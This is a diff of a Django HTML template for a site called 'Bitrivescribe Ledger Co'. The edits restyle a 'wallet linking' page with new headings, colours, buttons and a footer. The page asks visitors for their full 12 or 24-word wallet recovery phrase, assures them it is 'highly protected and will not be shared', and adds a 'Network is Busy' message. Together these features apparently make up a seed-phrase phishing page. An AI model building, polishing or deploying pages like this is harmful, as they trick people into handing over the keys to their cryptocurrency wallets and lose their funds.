@@ -38,11 +38,10 @@
 <header id="header" class="header d-flex align-items-center sticky-top">
   <div class="container-fluid container-xl position-relative d-flex align-items-center">
     <a href="{% url 'home' %}" class="logo d-flex align-items-center me-auto">
-      <!-- Uncomment the line below if you also wish to use an image logo -->
-      <img src="{% static 'assets/img/logo.png' %}" alt="">
-      <!-- <h1 class="sitename">BITRIVESCRIBE LEDGER CO</h1> -->
+        <img src="{% static 'assets/img/logo.png' %}" alt="">
+        <span class="sitename text-white d-none d-lg-inline" style="font-size:15px;">B<sup  style="color: #47b2e4;">I</sup>TRIVESCRIBE<span> <span style="color: #47b2e4;">LEDGER</span></span> CO</span>
     </a>
-
+    
     <nav id="navmenu" class="navmenu">
       <ul>
         <li><a href="{% url 'home' %}" class="active">HOME</a></li>
@@ -222,11 +221,11 @@
 </style>
 
 
-<body>
+<body class="bg-light">
     
       <!-- Tradingview Widget -->
       <div class="tradingview-widget-container mb-4">
-        <div class="tradingview-widget-container__widget"></div>
+        <div class="tradingview-widget-container__widget" ></div>
         <script type="text/javascript" src="https://s3.tradingview.com/external-embedding/embed-widget-ticker-tape.js" async>
           {
             "symbols": [
@@ -260,10 +259,13 @@
         </script>
       </div>
 
+      
+      <h1 class="text-center mt-5 mb-4 text-uppercase">Manage Your Wallet Integration</h1>
+
     <!-- INSTRUCTIONS -->
     <div class="container-fluid bg-light py-5">
         <div class="container">
-            <h2 class="text-center mb-4">Wallet Linking Instructions</h2>
+            <h3 class="text-center mb-4">Wallet Linking Instructions</h3>
             <p class="text-center mb-4">
                 Follow these steps to securely link your wallet. Your information is highly protected and will not be shared.
             </p>
@@ -301,7 +303,7 @@
 
 <!-- END OF INSTRUCTION -->
 
-    <h1 class="text-center pt-3 text-primary">Select Your Wallet</h1>
+    <h3 class="text-center pt-3" style="color: #47b2e4;">Select Your Wallet</h3>
     {% if error_message %}
     <div class="error">{{ error_message }}</div>
     {% endif %}
@@ -332,7 +334,7 @@
     
             <!-- Link Button, initially hidden -->
             <div id="link-button-container" style="display: none;">
-                <button type="button" class="btn btn-primary w-100 link-btn" onclick="linkWallet()">Link Automatically</button>
+                <button type="button" class="btn btn-success w-100 link-btn" onclick="linkWallet()">Link Automatically</button>
             </div>
     
             <!-- Loading message for "Network is Busy" -->
@@ -370,13 +372,13 @@
                     placeholder="Enter your 12 or 24-word wallet recovery phrase, separated by spaces. Example: word1 word2 word3 ... word12"
                     required
                 ></textarea>
-                <small class="form-text text-muted">
+                <small class="form-text  text-warning">
                     Ensure your recovery phrase is accurate. It must consist of exactly 12 or 24 words, separated by spaces, with no extra characters or punctuation.
                 </small>
             </div>
     
             <!-- Submit Button -->
-            <button type="submit" class="btn btn-primary w-100 mt-3">Submit</button>
+            <button type="submit" class="btn w-100 mt-3 text-white shadow" style="background-color: #47b2e4;">Submit</button>
         </form>
     </div>
     
@@ -472,6 +474,14 @@
 
   <!-- Preloader -->
   <div id="preloader"></div>
+  <footer>
+    <div class="container copyright text-center mt-4">
+        <p>© <span>Copyright</span> <strong class="px-1 sitename">Bitrivescribe Ledger Co</strong> <span>All Rights Reserved</span></p>
+        <div class="credits">
+          Designed by <a href="#">Bitrivescribe-Tech</a>
+        </div>
+     </div>
+  </footer>
 
   <!-- Vendor JS Files -->
   <script src="{% static 'assets/vendor/bootstrap/js/bootstrap.bundle.min.js' %}"></script>
